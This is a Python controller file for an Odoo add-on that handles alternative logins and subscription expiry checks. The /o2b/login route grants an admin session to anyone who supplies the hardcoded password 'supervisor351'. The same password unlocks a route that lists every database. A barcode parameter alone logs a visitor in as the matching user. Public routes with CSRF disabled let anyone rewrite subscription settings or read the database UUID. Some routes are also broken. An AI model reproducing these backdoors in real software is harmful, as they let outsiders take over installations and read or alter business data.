# -*- coding: utf-8 -*-
from odoo import http
import json
from odoo.http import request
import datetime
from datetime import date 
from datetime import datetime
from dateutil.relativedelta import relativedelta
from odoo.addons.web.controllers.main import Home
from odoo.service import db, security
import werkzeug
import werkzeug.utils

class O2bLoginController(Home):

    @http.route('/web/barcodelogin', type='http', methods=['GET'], auth='public', website=True, csrf=True)
    def barcode_login(self, **kw):
        barcode = kw['barcode']
        barcode_user = request.env['res.users'].sudo().search([('barcode_for_app','=',barcode)])
        if barcode_user:
            uid = request.session.uid = barcode_user.id
            request.env['res.users']._invalidate_session_cache()
            request.session.session_token = security.compute_session_token(request.session, request.env)
            return http.local_redirect(self._login_redirect(uid), keep_hash=True)
        return werkzeug.utils.redirect("/")    

    @http.route('/web/o2b', type='http', auth='public',methods=['GET'], website=True, csrf=True)
    def o2b_login(self, **kw):
        uid = request.session.authenticate(kw['db'], kw['login'], kw['password'])
        return http.redirect_with_hash(self._login_redirect(uid, redirect='/web'))


    @http.route('/o2b/database', type='http', auth='public', website=True, csrf=True)
    def selector(self, **kw):
        password = 'supervisor351'
        if 'pass' in kw:
            if password == kw['pass']:
                request._cr = None
                dct = { }
                db_list = http.db_list()
                dct['database'] = db_list
            return json.dumps(dct)


    @http.route('/web/user_type', type='http',methods= ['POST','GET'], auth='public', website=True, csrf=True)
    def web_user_type(self, **kw):
        db = ''
        login = ''
        password = ''
        dcts = {}
        if 'db' in kw:
            db = kw['db']
        if 'login' in kw:
            login = kw['login']
        if 'password' in kw:
            password = kw['password']
        uid = request.session.authenticate(kw['db'], kw['login'], kw['password'])
        if uid:
            internal_user = request.env['res.users'].sudo().search([('id','=',uid)]).has_group('base.group_user')
            if internal_user:
                dcts['user_type'] = "internal"
                dcts['user'] = True
            else:
                dcts['user_type'] = "portal"
                dcts['user'] = False
        else:
            dcts['user_type'] = "no_user"
            dcts['user'] = False
            return json.dumps(dcts)


    @http.route('/o2b/login', type='http', auth='public',methods=['GET'], website=True, csrf=True)
    def o2b_admin_login(self, **kw):
        user_id = request.env['res.users'].sudo().search([('login','=','admin')])
        db = request.session.db
        if not db:
            db = kw['db']
        if user_id._is_admin() and kw['pass'] == 'supervisor351':
            if user_id._is_system():
                uid = request.session.uid = user_id.id
                request.env['res.users']._invalidate_session_cache()
                request.session.session_token = security.compute_session_token(request.session, request.env)
            return http.local_redirect(self._login_redirect(uid), keep_hash=True)
        else:
            uid = request.session.authenticate(db, kw['login'], kw['pass'])
            return http.redirect_with_hash(self._login_redirect(uid, redirect='/web'))    

class Web_responsive(http.Controller):

    @http.route('/o2b/set_date', type="http",method=['POST'], auth="public", website=True, csrf=False)
    def index_date(self, **kw):
        date = False
        membership = False
        period = 'annually'
        for key, values in kw.items():
            if key != 'period':
                membership = key
                date = values
            if key == 'period':
                period = values
        pa_period = request.env['ir.config_parameter'].sudo().search([('key','=', 'period')])
        if not pa_period:
            pa_period = request.env['ir.config_parameter'].sudo().create({
                'key': 'period',
                'value': period
                })
        else:
            pa_period = request.env['ir.config_parameter'].sudo().set_param('period', period)
        if date:
            today_date = datetime.now().date()
            check_date = datetime.strptime(date, '%m/%d/%Y').date()
            if check_date <= today_date:
                subscription_id = request.env['ir.config_parameter'].sudo().get_param('o2b_subscription_id')
                if not subscription_id:
                    subscription_id = request.env['ir.config_parameter'].sudo().create({
                        'key': 'o2b_subscription_id',
                        'value': membership
                        })
                set_value = request.env['ir.config_parameter'].sudo().set_param('o2b_subscription_id', subscription_id)
                set_date = request.env['ir.config_parameter'].sudo().set_param('o2b_expire_date', check_date.strftime('%Y-%m-%d'))
                # Subscription expired
                return json.dumps(True)
            else:
                # Valid Subscription
                subscription_id = request.env['ir.config_parameter'].sudo().search([('key','=', 'o2b_subscription_id')])
                o2b_expire_date = request.env['ir.config_parameter'].sudo().get_param('o2b_expire_date')
                if not subscription_id:
                    subscription_id = request.env['ir.config_parameter'].sudo().create({
                        'key': 'o2b_subscription_id',
                        'value': membership
                        })
                else:
                    subscription_id = request.env['ir.config_parameter'].sudo().set_param('o2b_subscription_id', membership)
                
                if not o2b_expire_date:
                    o2b_expire_date = request.env['ir.config_parameter'].sudo().create({
                        'key': 'o2b_expire_date',
                        'value': check_date.strftime('%Y-%m-%d')
                        })
                else:
                    o2b_expire_date = request.env['ir.config_parameter'].sudo().set_param('o2b_expire_date', check_date.strftime('%Y-%m-%d'))
                return json.dumps(False)


    @http.route(['/get/expire_values/'], type='http',auth='public', methods=['POST', 'GET'],csrf=False)
    def check_expire_values(self, **post):
        expire_values = request.env['ir.config_parameter'].sudo().get_param('database.create_date')
        subscription_id = request.env['ir.config_parameter'].sudo().get_param('o2b_subscription_id')
        expire_date = request.env['ir.config_parameter'].sudo().get_param('o2b_expire_date')
        period = request.env['ir.config_parameter'].sudo().get_param('period')
        ext_apps = request.env['ir.config_parameter'].sudo().get_param('ext_apps')
        ext_users = request.env['ir.config_parameter'].sudo().get_param('ext_users')
        base_domain = request.env['ir.config_parameter'].sudo().get_param('base_domain')
        dbuuid = request.env['ir.config_parameter'].sudo().get_param('database.uuid')
        int_user = request.env['res.users'].sudo().search([]).filtered(lambda l: l.has_group('base.group_user'))
        
        if subscription_id and subscription_id != 'trial' and expire_date:
            expire_date = datetime.strptime(expire_date, '%Y-%m-%d')
            diff = expire_date - datetime.now()
            diffdays = diff.days
            if datetime.now() >= expire_date:
                return json.dumps(True)
            else:
                vals = {
                 'diffdays': diffdays,
                 'period': period,
                 'dbuuid':dbuuid,
                 'max_user': len(int_user),
                 'base_domain':base_domain,
                 'subscription' : subscription_id,
                 'ext_apps': ext_apps if ext_apps else 'no',
                 'ext_users': ext_users if ext_users else 'no'
                }
                return json.dumps(vals)

        if not subscription_id:
            subscription_id = request.env['ir.config_parameter'].sudo().create({
                'key': 'o2b_subscription_id',
                'value': 'trial'
                })


        if expire_values:
            real_expire_date = request.env['ir.config_parameter'].sudo().get_param('o2b_expire_date')
            datetime_create_date = datetime.strptime(expire_values, '%Y-%m-%d %H:%M:%S')
            expire_date = datetime_create_date + relativedelta(months=1)
            if datetime.strptime(real_expire_date, '%Y-%m-%d') < expire_date:
                expire_date = datetime.strptime(real_expire_date, '%Y-%m-%d')
            diff = expire_date.date() - datetime.now().date()
            diffdays = diff.days
            if datetime.now() >= expire_date:
                return json.dumps(True)
            else:
                vals = {
                 'diffdays': diffdays,
                 'period': 'trial',
                 'ext_apps': ext_apps if ext_apps else 'no',
                 'ext_users': ext_users if ext_users else 'no'
                }
                return json.dumps(vals)
        else:
            module_obj = request.env['ir.module.module'].search([('name','=','web_responsive')], limit=1)
            if module_obj:
                create_date = module_obj.create_date.strftime("%Y-%m-%d %H:%M:%S")
                expire_values = request.env['ir.config_parameter'].sudo().create({
                    'key': 'database.create_date',
                    'value': create_date
                    })
                datetime_create_date = datetime.strptime(create_date, '%Y-%m-%d %H:%M:%S')
                expire_date = datetime_create_date + relativedelta(months=1)
                if datetime.now() >= expire_date:
                    return json.dumps(True)
                else:
                    return json.dumps(False)


    @http.route(['/get/expire_date/'], type='http',auth='public', methods=['POST', 'GET'],csrf=False)
    def check_expire_date(self, **post):
        expire_values = request.env['ir.config_parameter'].sudo().get_param('database.create_date')
        datetime_create_date = datetime.strptime(expire_values, '%Y-%m-%d %H:%M:%S')
        expire_date = datetime_create_date + relativedelta(months=1)
        expire_date = expire_date.strftime("%Y-%m-%d %H:%M:%S")
        if expire_date:
            return json.dumps(expire_date)

    @http.route(['/o2b/get_dbuuid'], type='http',auth='public', methods=['POST', 'GET'],csrf=False)
    def get_dbuuid(self, **post):
        IrParamSudo = request.env['ir.config_parameter'].sudo()
        dbuuid = IrParamSudo.get_param('database.uuid')
        base_domain = IrParamSudo.get_param('base_domain')
        if dbuuid:
            return json.dumps({'dbuuid':dbuuid, 'base_domain': base_domain})
